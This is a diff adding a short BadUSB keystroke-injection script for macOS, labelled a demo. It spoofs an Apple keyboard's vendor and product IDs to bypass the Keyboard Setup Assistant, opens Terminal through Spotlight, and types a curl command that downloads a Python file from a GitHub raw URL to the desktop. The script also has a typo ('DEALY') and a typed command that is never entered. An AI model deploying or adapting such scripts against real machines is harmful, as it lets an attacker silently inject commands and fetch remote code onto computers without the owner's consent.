@@ -1,0 +1,24 @@
+ID 05ac:021e Apple:Keyboard
+REM You can change these values to VID/PID of original Apple keyboard
+REM to bypass Keyboard Setup Assistant
+
+REM This is BadUSB demo script for macOS
+
+REM open terminal window:
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 750
+STRING python3 --version
+DEALY 750
+
+
+STRING cd desktop
+ENTER
+DELAY 900
+STRING curl -o filename.py https://raw.githubusercontent.com/one-degree-north/mate-2023-rnd/main/main.py
+DELAY 400
+ENTER
